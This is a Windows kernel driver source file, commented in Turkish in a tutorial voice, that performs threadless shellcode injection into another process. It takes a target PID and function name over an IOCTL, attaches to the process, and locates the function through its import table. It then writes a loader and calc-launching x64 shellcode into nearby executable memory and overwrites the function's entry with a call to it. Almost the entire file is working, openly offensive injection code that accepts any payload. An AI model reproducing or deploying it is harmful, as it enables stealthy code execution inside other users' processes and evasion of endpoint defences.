// driver.c
#define _WIN10_
#include "Loader.h"

#define DEVICE_NAME     L"\\Device\\IATPatch"
#define SYMLINK_NAME    L"\\DosDevices\\IATPatch"
#define IOCTL_IAT_PATCH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IMAGE_ORDINAL_FLAG 0x8000000000000000

typedef struct _INJECTION_DATA {
    int pid;
    char functionName[256]; // shellcode address
} INJECTION_DATA, * PINJECTION_DATA;

unsigned char CalcX64[] = {
        0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

unsigned char ShellcodeLoader[] = {
        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
        0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
        0xE0, 0x90
};

NTSTATUS FindMemoryHole(
    HANDLE hProcess,
    ULONGLONG exportAddress,
    SIZE_T size,
    PVOID* outAllocatedAddress
) {
    ULONGLONG start = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
    ULONGLONG end = exportAddress + 0x70000000;
    ULONGLONG addr;
    SIZE_T regionSize = size;
    PVOID baseAddress = NULL;
    for (addr = start; addr < end; addr += 0x10000) {
        baseAddress = (PVOID)addr;
        regionSize = size;
        NTSTATUS status = ZwAllocateVirtualMemory(
            hProcess,
            &baseAddress,
            0,
            &regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (NT_SUCCESS(status)) {
            *outAllocatedAddress = baseAddress;
            return STATUS_SUCCESS;
        }
    }
    return STATUS_NOT_FOUND;
}

PVOID GetImportedFunctionAddress(PVOID moduleBase,const char* targetFuncName) {
    if (!moduleBase) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((unsigned char*)moduleBase + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress == 0) return NULL;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((unsigned char*)moduleBase + importDir.VirtualAddress);

    while (importDesc->Name) {
        char* dllName = (char*)((unsigned char*)moduleBase + importDesc->Name);
        DbgPrint("Module Name: %s\n", dllName);
        PIMAGE_THUNK_DATA64 origThunk = (PIMAGE_THUNK_DATA64)((unsigned char*)moduleBase + importDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA64 firstThunk = (PIMAGE_THUNK_DATA64)((unsigned char*)moduleBase + importDesc->FirstThunk);

        while (origThunk->u1.AddressOfData) {
            if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)((unsigned char*)moduleBase + origThunk->u1.AddressOfData);
                DbgPrint("-> %s\n", (const char*)name->Name);
                if (_stricmp((const char*)name->Name, targetFuncName) == 0) {
                    DbgPrint("Found! addr: %p", firstThunk->u1.Function);
                    return (PVOID)(firstThunk->u1.Function);
                }
            }
            origThunk++;
            firstThunk++;
        }
        importDesc++;
    }

    return NULL;
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject) {
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(pDriverObject->DeviceObject);
}

NTSTATUS create_io(PDEVICE_OBJECT device_obj, PIRP irp) {
    UNREFERENCED_PARAMETER(device_obj);

    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return irp->IoStatus.Status;
}

NTSTATUS close_io(PDEVICE_OBJECT device_obj, PIRP irp) {
    UNREFERENCED_PARAMETER(device_obj);

    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return irp->IoStatus.Status;
}

NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_IAT_PATCH) {
        PINJECTION_DATA data = (PINJECTION_DATA)Irp->AssociatedIrp.SystemBuffer;

        DbgPrint("Target PID: %x\n", data->pid);
        DbgPrint("Hooking function name: %s\n", data->functionName);

        PEPROCESS targetProc = NULL;
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)data->pid, &targetProc))) {//Kernel seviyesi driver ımız client den gelen pid i kullanarak `PsLookupProcessByProcessId` api si ile PEPROCESS objesini elde ediyor.
            KAPC_STATE apc;
            KeStackAttachProcess(targetProc, &apc);// Sonra hedef process e `KeStackAttachProcess` api si ile attach oluyor bu bizim kernel driver ımızın hedef process in adresi alanına geçmesini sağlıyor bu sayede hedef memory de kafamıza göre takılabiliyoruz.

            PPEB pPeb = NULL;
            PLIST_ENTRY pDllListHead = NULL;
            UNICODE_STRING usMethodName;

            PVOID imageBase = NULL;


            pPeb = PsGetProcessPeb(targetProc);//`PsGetProcessPeb` api si ile peb structure ının adresini alıyoruz.
            imageBase = pPeb->ImageBaseAddress;//Sonra bu adresi kullanarak imageBase adresini alıyoruz.
            PVOID func = GetImportedFunctionAddress(imageBase, data->functionName);//imageBase sayesinde artık MZ Header başlangıcını bildiğimizden import table ın yerini bulabiliyoruz. Sonra size yukarda anlattığım yolla client ın hook atmamızı istediği fonksiyonun adresini IAT dan buluyoruz(`GetImportedFunctionAddress` fonksiyonunda gerçekleşiyor bu olay).
            PVOID funcc = func;//aşağıda açıklayacağım sebepten ötürü burda fonksiyon adresini yedekliyoruz
            if (!func) {
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
                return status;
            }
            //Artık fonksiyon adresimizi bulduk şimdi shellcode u memory ye yerleştirip fonksiyonun girişine hook atmak kaldı.
            //Bundan sonrası ilk parça da anlattığım basit bir saldırıdaki csharp koduna çok benziyor sadece api lerin kernel mode versiyonları farklı.
            unsigned char finalPayload[512];
            memset(finalPayload, 0, sizeof(finalPayload));
            memcpy(&ShellcodeLoader[0x12], func, sizeof(PVOID));//ShellCodeLoader ın placeholder kısmına hook fonksiyonunun patch edilecek kısmını dolduruyoruz bu sayede shellcode çalıştırıldıktan sonra fonksiyonu eski haline getirebilicez.
            memcpy(finalPayload, ShellcodeLoader, sizeof(ShellcodeLoader));
            memcpy((unsigned char*)finalPayload + sizeof(ShellcodeLoader), CalcX64, sizeof(CalcX64));//ShellCodeLoader ve shellcode u finalPayload isimli başka bir değişkende topluyoruz.
            unsigned char callOpCode[5] = {0xe8, 0, 0, 0, 0};

            //PVOID loaderAddress = NULL;
            SIZE_T payloadSize = sizeof(finalPayload);
            PVOID baseAddress = NULL;
            FindMemoryHole(ZwCurrentProcess(), funcc, sizeof(finalPayload), &baseAddress);//Sonra hook atacağımız fonksiyon adresinden relative call ile gidilebilecek bir yeri allocate etmek için `FindMemoryHole` fonksiyonnu çağırıyoruz.

            SIZE_T bytesCopied = 0;
            status = MmCopyVirtualMemory(PsGetCurrentProcess(), finalPayload, targetProc, baseAddress, sizeof(finalPayload), KernelMode, &bytesCopied);//Allocate ettiğimiz adrese payload u yerleştiriyoruz.
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] MmCopyVirtualMemory1 failed: 0x%X\n", status);
                goto cleanup;
            }

            INT32 relOffset = (INT32)((UINT64)baseAddress - ((UINT64)func + 5));
            memcpy(&callOpCode[1], &relOffset, sizeof(INT32));
            ULONG oldProtect = 0;
            SIZE_T regionSize = sizeof(callOpCode);
            status = ZwProtectVirtualMemory(ZwCurrentProcess(), &funcc,&regionSize,PAGE_EXECUTE_READWRITE,&oldProtect);//hook atacağımız fonksiyon adresinin protect mode unu değiştirmek için `ZwProtectVirtualMemory` api sini çağrıyoruz
            funcc = func;//bu api ile ilgili ilginc bir detay var ki api protect mode unu değiştirmek için ona verdiğiniz adresi protect mode unu değiştirdiği adres page inin başı yapıp size geri veriyor bu yüzden func adresini tekrar funcc un üzerine yazıyorum. Bunu fark edene kadar başıma neler geldi inanamazsınız:D
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] ZwProtectVirtualMemory1 failed: 0x%X\n", status);
                goto cleanup;
            }
            status = MmCopyVirtualMemory(PsGetCurrentProcess(), callOpCode, targetProc, funcc, sizeof(callOpCode), KernelMode, &bytesCopied);//relative call için offset hesaplıyoruz bu offset i kullanarak instruction u oluşturup hook fonksiyonunun üzerine yazıyoruz
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] MmCopyVirtualMemory2 failed: 0x%X\n", status);
                goto cleanup;
            }
            //Sonra protect i gene eski haline getirmem gerekiyor aslında ama bunu yapmadım çünkü yaparsam shellcode oraya eski fonksiyon instruction ı yazmaya çalıştığında access hatası alıyor o yüzden orjinal [ThreadlessInject](https://github.com/CCob/ThreadlessInject/tree/master) projesinde 60 saniye beklenip
            //instruction eğer eskisi gibiyse shellcode un restore işleminin gerçekleştiği varsayılıp protect mode u düzeltiliyor ama ben kendi kodlarımda 60 saniye beklemeyi reddettiğim için banane edasıyla bunu sadece boşvermeye karar verdim.
            /*
            status = ZwProtectVirtualMemory(ZwCurrentProcess(),&funcc,&regionSize,oldProtect,&oldProtect);
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] ZwProtectVirtualMemory2 failed: 0x%X\n", status);
                goto cleanup;
            }
            */
        // Sonrasında attach olduğumuz process den çıkıyoruz ve irp yi işlemin bitirildiğine yönelik düzenleyip fonksiyondan çıkışımızı gerçekleştiriyoruz.
        cleanup:
            ObDereferenceObject(targetProc);
            KeUnstackDetachProcess(&apc);
            Irp->IoStatus.Status = status;
            Irp->IoStatus.Information = 0;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
        }
        else {
            status = STATUS_INVALID_PARAMETER;
        }
    }
    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING RegistryPath) {
    UNICODE_STRING devName, symLink;
    PDEVICE_OBJECT devObj = NULL;
    NTSTATUS status;
    RtlInitUnicodeString(&devName, DEVICE_NAME);
    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    status = IoCreateDevice(pDriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }
    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] IoCreateSymbolicLink failed: 0x%X\n", status);
        IoDeleteDevice(devObj);
        return status;
    }
    SetFlag(pDriverObject->Flags, DO_BUFFERED_IO);
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = create_io; //link our io create function
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = close_io;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    pDriverObject->DriverUnload = DriverUnload;
    ClearFlag(pDriverObject->Flags, DO_DEVICE_INITIALIZING);
    DbgPrint("[+] Driver loaded successfully\n");
    return STATUS_SUCCESS;
}

